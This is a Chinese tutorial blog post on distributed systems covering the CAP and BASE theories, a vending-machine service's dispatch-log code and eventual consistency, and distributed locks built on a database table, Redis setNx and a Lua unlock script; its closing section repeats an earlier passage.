pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<h2 data-id="heading-0">1.分布式相关理论(重点)</h2>
<h3 data-id="heading-1">1.1 CAP定理<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8cfd7d997b8f4b9ba2281d931a5eafd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=AOupmtP2Us8lA%2BlAYx1Z2SX2ei0%3D" alt="" loading="lazy"/><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>​编辑</h3>
<p>CAP定理，也称为布鲁尔定理，是分布式计算领域的一个基本原理，用于描述在分布式系统设计中的三个基本要素：一致性（Consistency）、可用性（Availability）和分区容错性（Partition Tolerance）之间的权衡关系。</p>
<p>CAP定理表明，在一个分布式计算系统中，不可能同时满足一致性、可用性和分区容错性这三个要求，最多只能同时满足其中的两个。具体而言：</p>
<ol>
<li>一致性（Consistency）指的是在分布式系统中的所有节点，在同一时间点上是否具有相同的数据副本。如果系统在更新数据后，所有节点立即能够看到最新的数据，那么系统就是强一致性的；如果系统在更新数据后，不同节点的数据同步存在一定的延迟，那么系统就是弱一致性的。</li>
<li>可用性（Availability）指的是系统能够在有限的时间内对外提供服务，即系统能够处理请求并返回合理的响应。可用性要求系统在面对故障或异常情况时，仍能够保持正常的运行状态，对外提供服务。</li>
<li>分区容错性（Partition Tolerance）指的是系统能够在面对网络分区（节点之间的通信故障）时，仍能够继续运行，并保持数据一致性和可用性。分布式系统中的网络分区是不可避免的，因此分区容错性是必须考虑的因素。</li>
</ol>
<p>根据CAP定理，分布式系统设计者需要在一致性、可用性和分区容错性之间进行权衡取舍。根据实际需求和应用场景的不同，可以选择满足不同程度的一致性和可用性。</p>
<p>需要注意的是，CAP定理是一个理论上的原则，并没有要求系统只能满足其中的两个要求，实际系统可以根据具体需求和技术手段做出更细致的权衡和设计。此外，CAP定理只描述了三个基本要素之间的关系，并没有涉及性能、性价比等其他方面的考虑。在实际系统设计中，还需要结合具体的业务需求和技术实现来进行综合权衡和设计。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dc07eded0594004b4a98ee04af5e415~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=WirfF8OMb%2BemuUTCTBlYlX1dlwc%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<ul>
<li>CP 架构的系统:</li>
</ul>
<p>（1）<strong>Apache ZooKeeper</strong>：ZooKeeper是一个开源的分布式协调服务，提供了高可用、一致性和持久性的特性，用于构建分布式系统。</p>
<p>（2）<strong>Consul</strong>是由HashiCorp开发的服务发现和配置工具，提供了服务发现、健康检查、KV存储和多数据中心的功能。</p>
<ul>
<li>AP架构的系统：</li>
</ul>
<p>（1）<strong>Redis</strong>：Redis是一个开源的内存数据库，它提供了高性能的键值存储和支持复制、分区容错等特性，强调了可用性和分区容错性。</p>
<p>（2）<strong>Elasticsearch</strong>：Elasticsearch是一个分布式的搜索和分析引擎，具有高可用性和分区容错性，适用于构建实时搜索和分析系统。</p>
<p>（3）<strong>Apache Kafka</strong>：Kafka是一个分布式流处理平台，具有高可用性和分区容错性，被广泛用于构建实时数据管道和事件流处理系统。</p>
<p>（4）<strong>Nacos</strong>： nacos 是一个开源的动态服务发现、配置管理和服务管理平台。它提供了服务注册与发现、动态配置管理、服务健康检查和动态DNS等功能。默认AP，可手动改为CP 。</p>
<h3 data-id="heading-2">2.2 BASE理论</h3>
<p>BASE理论是分布式系统设计中的一个原则，用于描述在大规模分布式系统中追求可用性和性能的策略。BASE是"Basically Available, Soft state, Eventually consistent"的缩写。</p>
<ul>
<li><strong>Basically Available</strong>（基本可用）：系统在面对部分故障或异常情况时，仍能够保持基本的可用性，即系统能够处理请求并返回合理的响应。基本可用性是相对于完全不可用而言的，系统可以通过<strong>降级、限流</strong>等机制来保持基本的可用性。</li>
<li><strong>Soft state</strong>（软状态）：系统中的数据状态可以在一段时间内是不完全一致的。在分布式系统中，由于存在网络延迟、节点故障等因素，各节点之间的数据同步可能存在一定的延迟。软状态的特点是数据状态可以在一段时间内是部分一致的，但最终会达到一致状态。</li>
<li><strong>Eventually consistent</strong>（最终一致性）：系统中的数据最终会达到一致状态，但在某个时间点上可能存在部分不一致的情况。最终一致性是相对于强一致性而言的，系统可以通过<strong>异步复制、延迟补偿</strong>等机制来实现数据的最终一致性。</li>
</ul>
<p>BASE理论的目标是通过放宽一致性要求，追求更高的可用性和性能。相对于传统的ACID（原子性、一致性、隔离性、持久性）事务模型，BASE理论更适用于大规模分布式系统，可以提供更好的可扩展性和容错性。</p>
<p>需要注意的是，BASE理论并不是一个具体的算法或实现，而是一种思想和原则，可以根据具体的业务需求和技术实现进行灵活的应用。在实际系统设计中，需要综合考虑一致性、可用性、性能等因素，选择适合的策略并进行合理的权衡。</p>
<h2 data-id="heading-3">2. 服务端设备运行日志</h2>
<h3 data-id="heading-4">2.1 需求分析</h3>
<p>当用户支付成功后，服务端需要向设备发送出货指令。设备收到出货指令后，执行出货，并将结果发送给服务端。</p>
<p>我们需要随时掌握有哪些数据是成功了，有哪些是失败了，有哪些是没有得到结果。</p>
<h3 data-id="heading-5">2.2 实现思路</h3>
<p>我们需要在服务端建立一个设备发送日志，当发送给设备指令时新增记录，状态为0 ，当收到结果时修改状态，成功为1 ，失败为2 。</p>
<p>这个表就是 tb_vendout_running</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37740863caa84e0aa5ef6cfa1912a5b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=VhonmMZSaAPNrwgbcNLoY9hafo4%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-6">2.3 代码实现</h3>
<h4 data-id="heading-7">2.3.1 发货添加日志</h4>
<p>（1）创建DTO</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VendoutRunningDTO</span> {


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> orderNo;<span class="hljs-comment">//订单编号</span>


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> innerCode;<span class="hljs-comment">//售货机编号</span>


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> channelCode;<span class="hljs-comment">//货道编号</span>


    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> status;<span class="hljs-comment">//状态</span>

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）feign接口类 VMService 新增方法定义</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 新增售货机日志
 * @param vendoutRunning
 * @return 是否成功
 */</span>
<span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/vendoutRunning"</span>)
public boolean <span class="hljs-built_in">addVendoutRunning</span>(<span class="hljs-variable">@RequestBody</span> VendoutRunningDTO vendoutRunning);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）VmServiceFallbackFactory 编写熔断方法</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">addVendoutRunning</span>(<span class="hljs-params">VendoutRunningDTO vendoutRunning</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）创建运行日志状态</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">/**
 * 运行日志状态　
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VMRuningStatus</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> VENDOUT_PREP = <span class="hljs-string">"0"</span>; <span class="hljs-comment">//准备发货　</span>

    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> VENDOUT_COMP = <span class="hljs-string">"1"</span>;<span class="hljs-comment">//完成发货</span>

    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> VENDOUT_FAIL = <span class="hljs-string">"2"</span>;<span class="hljs-comment">//发货失败</span>

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）在发送出货指令时，向售货机运行日志插入记录，状态为0 （无结果）</p>
<p>修改CallBackServiceImpl的successPay方法，在发送消息前 ， 添加添加售货机运行日志</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Override</span>
public void successPay(String orderSn) {
    log<span class="hljs-selector-class">.info</span>("支付成功回调{}",orderSn);
    OrderEntity orderEntity = orderService<span class="hljs-selector-class">.getByOrderNo</span>(orderSn);
    <span class="hljs-built_in">if</span>(orderEntity!=null){
        <span class="hljs-built_in">if</span>(orderEntity.getStatus()<span class="hljs-selector-class">.equals</span>( OrderStatus.ORDER_STATUS_CREATE )){
            orderEntity<span class="hljs-selector-class">.setStatus</span>(OrderStatus.ORDER_STATUS_PAYED); <span class="hljs-comment">//订单状态  已支付</span>
            orderEntity<span class="hljs-selector-class">.setPayStatus</span>(PayStatus.PAY_STATUS_PAYED) ;<span class="hljs-comment">//支付状态  成功</span>
            <span class="hljs-comment">//查询出货货道</span>
            ChannelVO channelVO = vmService<span class="hljs-selector-class">.getChannel</span>(orderEntity.getInnerCode(), orderEntity<span class="hljs-selector-class">.getSkuId</span>());
            orderEntity<span class="hljs-selector-class">.setChannelCode</span>( channelVO.getChannelCode() );
            orderService<span class="hljs-selector-class">.updateById</span>( orderEntity );

            <span class="hljs-comment">//添加服务端运行日志</span>
            VendoutRunningDTO vendoutRunning =new  <span class="hljs-built_in">VendoutRunningDTO</span>();
            BeanUtils<span class="hljs-selector-class">.copyProperties</span>( orderEntity,vendoutRunning );
            vendoutRunning<span class="hljs-selector-class">.setStatus</span>(VMRuningStatus.VENDOUT_PREP);  <span class="hljs-comment">//状态:准备发货</span>
            vmService<span class="hljs-selector-class">.addVendoutRunning</span>(vendoutRunning );

            <span class="hljs-comment">//构建报文并发送</span>
            VendoutDTO vendoutDTO=new <span class="hljs-built_in">VendoutDTO</span>();  <span class="hljs-comment">//报文封装对象  （数据传输对象）</span>
            BeanUtils<span class="hljs-selector-class">.copyProperties</span>( orderEntity,vendoutDTO );
            elegentAC<span class="hljs-selector-class">.publish</span>(TopicConfig.getVendoutTopic( orderEntity.getInnerCode() ) , vendoutDTO);
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-8">2.3.2 处理出货结果</h4>
<p>在售货机微服务接到正常的出货结果时，更改日志状态为1 （正常）</p>
<p>在售货机微服务接到异常的出货结果时，更改日志状态为2 （异常）</p>
<p>修改售货机微服务 dkd_vms_service的VendOutResultHandler方法</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 售货机微服务处理出货结果
 */</span>
<span class="hljs-variable">@Topic</span>(TopicConfig.VMS_RESULT_TOPIC)
<span class="hljs-variable">@Slf4j</span>
public class VendoutResultHandler  implements ACHandler&lt;VendoutResultDTO&gt; {


    <span class="hljs-variable">@Autowired</span>
    private ChannelService channelService;

    <span class="hljs-variable">@Autowired</span>
    private VendoutRunningService vendoutRunningService;

    <span class="hljs-variable">@Override</span>
    public void <span class="hljs-built_in">process</span>(String s, VendoutResultDTO vendoutResultDTO) throws Exception {

        <span class="hljs-comment">//出货成功扣减库存</span>
        <span class="hljs-selector-tag">if</span>(vendoutResultDTO.<span class="hljs-built_in">isSuccess</span>()){
            <span class="hljs-selector-tag">log</span><span class="hljs-selector-class">.info</span>( <span class="hljs-string">"出货成功，扣减库存:{}"</span>,  vendoutResultDTO );
            <span class="hljs-selector-tag">ChannelEntity</span> <span class="hljs-selector-tag">channelEntity</span> = <span class="hljs-selector-tag">channelService</span><span class="hljs-selector-class">.getChannelInfo</span>(vendoutResultDTO.<span class="hljs-built_in">getInnerCode</span>(), vendoutResultDTO.<span class="hljs-built_in">getChannelCode</span>());
            <span class="hljs-selector-tag">channelEntity</span><span class="hljs-selector-class">.setCurrentCapacity</span>( channelEntity.<span class="hljs-built_in">getCurrentCapacity</span>()-<span class="hljs-number">1</span> );
            <span class="hljs-selector-tag">channelService</span><span class="hljs-selector-class">.updateById</span>( channelEntity);
            <span class="hljs-selector-tag">vendoutRunningService</span><span class="hljs-selector-class">.updateStatus</span>(vendoutResultDTO.<span class="hljs-built_in">getOrderNo</span>(), VMRuningStatus.VENDOUT_COMP);<span class="hljs-comment">//发货成功</span>

        }<span class="hljs-selector-tag">else</span>{
            <span class="hljs-selector-tag">vendoutRunningService</span><span class="hljs-selector-class">.updateStatus</span>(vendoutResultDTO.<span class="hljs-built_in">getOrderNo</span>(), VMRuningStatus.VENDOUT_FAIL);<span class="hljs-comment">//发货失败</span>
        }
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-9">2.3.3 最终一致性补偿数据</h4>
<p>因为服务端和设备需要通过网络进行通信，这期间可能会因为网络原因无法将出货指令送达到设备，也有可能会在设备出货后因为网络故障无法将结果上报给服务端。这两种情况，都可能导致运行日志的状态为0 。</p>
<p>那么，遇到这种情况如何处理呢？我们采用的方案是最终一致性。</p>
<p>服务端和设备端都保存有日志记录，设备端在接收到指令后，也会记录在日志中。设备在上报前和上报后都会做记录，如果设备端的日志记录上报状态为未上报，则是因为网络原因导致无法及时上报消息。</p>
<p>对于这些没有成功上报的消息，设备端会每间隔一段时间再次进行状态的上报。这样一旦网络通畅了，就会实现数据的最终一致性。</p>
<h2 data-id="heading-10">3.分布式锁技术研究(重点)</h2>
<h3 data-id="heading-11">3.1 什么是分布式锁</h3>
<p>分布式锁是一种用于协调分布式系统中并发访问的机制。在分布式系统中，多个节点可能同时访问共享资源，为了避免数据不一致或竞争条件的发生，需要一种机制来确保在某个节点操作共享资源时，其他节点不能同时访问该资源。</p>
<p>分布式锁通过在分布式系统中引入一个全局的锁来实现这一目的。当一个节点需要访问共享资源时，它首先尝试获取分布式锁，如果成功获取到锁，则可以执行相应的操作；如果获取锁失败，则需要等待锁释放后再次尝试。</p>
<p>分布式锁可以使用各种技术和算法来实现，常见的实现方式包括基于数据库、基于缓存、基于ZooKeeper等。这些实现方式通常要考虑高可用性、性能和可靠性等因素。</p>
<p>使用分布式锁可以有效地控制分布式系统中的并发访问，确保数据的一致性和正确性。然而，分布式锁的设计和使用需要仔细考虑各种情况，避免死锁、性能瓶颈和单点故障等问题的发生。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef87d16f140447e68ecab793ff4e4a70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=%2FjfeWIr9J4%2FC7fCWCzgrs2H4uQM%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-12">3.2 分布式锁的分类</h3>
<ol>
<li><strong>按实现方式分类</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li>基于数据库的分布式锁：使用数据库的事务和唯一约束来实现分布式锁，通常使用表中的一行记录表示一个锁。</li>
<li>基于缓存的分布式锁：利用分布式缓存（如Redis）的原子性操作和过期时间特性来实现分布式锁。</li>
<li>基于Zookeeper的分布式锁：利用ZooKeeper这样的分布式协调服务来实现分布式锁，通过创建和删除节点来实现锁的获取和释放。</li>
<li>基于Consul 的分布式锁</li>
</ul>
</li>
</ul>
<ol>
<li><strong>按特性分类</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>阻塞锁</strong>：获取锁失败时，请求线程会被阻塞直到获取到锁为止。</li>
<li><strong>非阻塞锁</strong>：获取锁失败时，请求线程会立即返回而不会被阻塞，可以通过轮询或者回调方式来获取锁。</li>
</ul>
</li>
</ul>
<ol>
<li><strong>按是否可重入分类</strong>：</li>
</ol>
<ul>
<li>
<ul>
<li><strong>可重入锁</strong>：允许同一个线程多次获取同一把锁，通常用于递归调用或者嵌套调用的场景。<br/>
可重入锁是一种特殊的锁，允许同一个线程在持有锁的情况下多次获取该锁，而不会被自己所持有的锁所阻塞。这种特性使得线程可以在递归调用或者嵌套调用的情况下安全地使用锁，而不必担心死锁或者竞争条件的问题。<br/>
在实现可重入锁时，通常需要记录当前锁的持有者以及持有次数。当线程再次获取同一把锁时，系统会检查当前线程是否已经持有该锁，如果是，则增加持有次数；如果不是，则阻塞或者返回失败。</li>
<li><strong>不可重入锁</strong></li>
</ul>
</li>
</ul>
<ol>
<li>按是否公平分类：</li>
</ol>
<ul>
<li>
<ul>
<li>
<p><strong>公平锁</strong>：<br/>
公平锁是一种锁，它保证锁的获取按照请求的顺序进行分配，避免某些线程长期等待而无法获取锁的情况，从而避免了"饥饿"现象的发生。<br/>
在公平锁中，当有多个线程竞争同一把锁时，锁会按照请求的顺序分配给等待时间最长的线程，而不是随机分配给任意一个等待的线程。这样可以确保所有线程都有公平的机会获取锁，避免了某些线程长期无法获取锁的情况。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fd41aa4e0464835b93fa5f54be31190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=Bx%2BV%2BGGtlJI5hE%2BGsfihrFb2zro%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
</li>
<li>
<p><strong>非公平锁</strong> 当有多个线程竞争同一把锁时 ，随机分配给任意一个等待的线程。</p>
</li>
<li>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b96573af220444ec8ecc4d4939902b7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=eWMIikYuld5wRU2ea%2FMfil2iiek%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-13">3.3 实现分布式锁的几种方式</h3>
<h4 data-id="heading-14">3.3.1 基于数据库实现的分布式锁（了解）</h4>
<p><strong>创建锁表</strong>：在数据库中创建一张用于存储锁信息的表，例如名为<code>distributed_lock</code>，包括以下字段：</p>
<ul>
<li><code>lock_name</code>：锁的名称，用于区分不同的锁。</li>
<li><code>holder</code>：锁的持有者标识，可以是进程ID、线程ID或者唯一的标识符。</li>
<li><code>expire_time</code>：锁的过期时间，避免锁被长时间占用。</li>
</ul>

<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> distributed_lock (
    lock_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">PRIMARY</span> KEY,
    holder <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),
    expire_time <span class="hljs-type">TIMESTAMP</span>
);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>获取锁</strong>：在需要获取锁的地方，通过数据库事务来尝试插入一条锁记录，如果插入成功则表示获取到了锁，否则表示锁已经被其他进程持有。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> distributed_lock (lock_name, holder, expire_time) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'my_lock'</span>, <span class="hljs-string">'process_id'</span>, NOW() <span class="hljs-operator">+</span> <span class="hljs-type">INTERVAL</span> <span class="hljs-number">10</span> <span class="hljs-keyword">SECOND</span>);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>释放锁</strong>：在任务执行完成或者锁过期时，通过事务操作来删除对应的锁记录，释放锁资源。</p>
<pre><code class="hljs language-ini" lang="ini">DELETE FROM distributed_lock WHERE <span class="hljs-attr">lock_name</span> = <span class="hljs-string">'my_lock'</span> AND holder = <span class="hljs-string">'process_id'</span><span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>处理锁超时</strong>：定期清理过期的锁记录，可以通过定时任务或者后台进程来实现。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> distributed_lock <span class="hljs-keyword">WHERE</span> expire_time <span class="hljs-operator">&lt;</span> NOW();
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>优缺点：</p>
<p>优点：不需要引入其它中间件。</p>
<p>缺点：对数据库压力较大，执行效率较低。</p>
<h4 data-id="heading-15">3.3.2 Redis分布式锁-setNx命令(了解)</h4>
<p>redis实现分布式锁可以使用Redis的setNx命令来实现，它的原理是这样的：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6cfa1d717614f3c9c26aa17f6ddeb2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=SjMQRpqZFutkj%2FJtSR0kUd10MSw%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>如果你使用的是SpringDataRedis ,实现的方式也比较简单：</p>
<p>如果是加锁，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">Boolean <span class="hljs-attr">result</span> = redisTemplate.opsForValue().setIfAbsent(key, <span class="hljs-number">1</span>, <span class="hljs-number">60</span>, TimeUnit.SECONDS)<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这里面实际就是调用了redis的setnx ，<strong>setnx</strong> 大致原理，主要依托了它的<strong>key不存在才能set成功的特性</strong>。</p>
<p>如果是释放锁，比较简单的是直接把这个key删除掉。但是这样一来删除锁和加锁的不一定是同一个进程，所以我们需要释放锁的时候判断当前进程和加锁的进程是不是同一个进程，这就需要在删除前再查询一次，而这样一来就不是一个原子操作了。如果释放锁想要成为一个原子操作，比较常见的方案就是通过调用lua脚本来实现。</p>
<p>释放锁的lua脚本是这样写的：</p>
<pre><code class="hljs language-lua" lang="lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">'get'</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] 
 <span class="hljs-keyword">then</span> 
 <span class="hljs-comment">-- 执行删除操作</span>
 <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">'del'</span>, KEYS[<span class="hljs-number">1</span>]) 
<span class="hljs-keyword">else</span> 
 <span class="hljs-comment">-- 不成功，返回0</span>
 <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> 
 <span class="hljs-keyword">end</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>在这个Lua脚本中，假设锁的键名为<code>KEYS[1]</code>，并且锁的值为<code>ARGV[1]</code>。脚本首先通过<code>get</code>命令获取锁的当前值，然后判断锁的当前值是否与传入的值相同。如果相同，则使用<code>del</code>命令删除该键，表示成功释放锁；如果不相同，则返回0，表示释放失败。</p>
<p>执行释放锁的lua脚本</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 解锁脚本</span>
<span class="hljs-title class_">DefaultRedisScript</span>&lt;<span class="hljs-title class_">Object</span>&gt; unlockScript = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>();
unlockScript.<span class="hljs-title function_">setScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceScriptSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathResource</span>(<span class="hljs-string">"lockDel.lua"</span>)));
 <span class="hljs-comment">// 执行lua脚本解锁</span>
 redisTemplate.<span class="hljs-title function_">execute</span>(unlockScript, <span class="hljs-title class_">Collections</span>.<span class="hljs-title function_">singletonList</span>(keyName), value);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>【知识点小节】</p>
<ol>
<li>如何实现redis分布式锁？</li>
</ol>
<p>（1）我们可以使用Redis的setNx命令加锁，对于我们常用的SpringDataRedis框架来说，可以使用setIfAbsent方法来实现加锁。</p>
<p>（2）这种方式的释放锁不具备原子性，所以我们需要将释放锁的操作放到lua脚本，在代码中调用lua脚本来实现。我们可以使用redisTemplate的execute方法来调用lua脚本。</p>
<h4 data-id="heading-16">redis实现分布式锁可以使用Redis的setNx命令来实现，它的原理是这样的：</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a9f53e510844a2fa8ad2d6ce1b371b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491036&amp;x-signature=V3dOW%2BfWwtbA8uNRrD1tVJcM3oQ%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>如果你使用的是SpringDataRedis ,实现的方式也比较简单：</p>
<p>如果是加锁，代码如下：</p>
<pre><code class="hljs language-ini" lang="ini">Boolean <span class="hljs-attr">result</span> = redisTemplate.opsForValue().setIfAbsent(key, <span class="hljs-number">1</span>, <span class="hljs-number">60</span>, TimeUnit.SECONDS)<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>这里面实际就是调用了redis的setnx ，<strong>setnx</strong> 大致原理，主要依托了它的<strong>key不存在才能set成功的特性</strong>。</p>
